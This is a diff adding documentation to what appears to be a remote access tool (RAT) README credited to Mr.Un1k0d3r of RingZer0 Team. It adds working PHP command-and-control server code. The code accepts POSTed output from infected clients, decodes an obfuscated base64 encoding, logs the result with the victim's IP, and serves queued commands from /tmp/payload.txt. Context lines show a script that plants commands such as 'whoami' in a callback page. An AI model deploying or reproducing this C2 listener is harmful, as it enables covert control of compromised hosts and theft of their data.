@@ -101,6 +101,27 @@ print "Command added"
 update.py /var/www/html/callback.html "whoami"
 ```
 
+For the post back RAT the following PHP code can be used to capture the data
+
+```
+<?php
+$request = (object)array();
+
+if($_SERVER['REQUEST_METHOD'] === "POST") {
+        $request->data = file_get_contents("php://input");
+        $request->ip = $_SERVER["REMOTE_ADDR"];
+        $request->time = date("r");
+
+        $data = str_replace("!)(*&#:<]", "A", $request->data);
+        $decoded = base64_decode($data);
+
+        file_put_contents("/tmp/output.txt", "[" . $request->time . "](" . $request->ip . "): " . $decoded . "\r\n", FILE_APPEND);
+} else {
+        echo file_get_contents("/tmp/payload.txt");
+}
+?>
+```
+
 # Credit
 
 Mr.Un1k0d3r RingZer0 Team
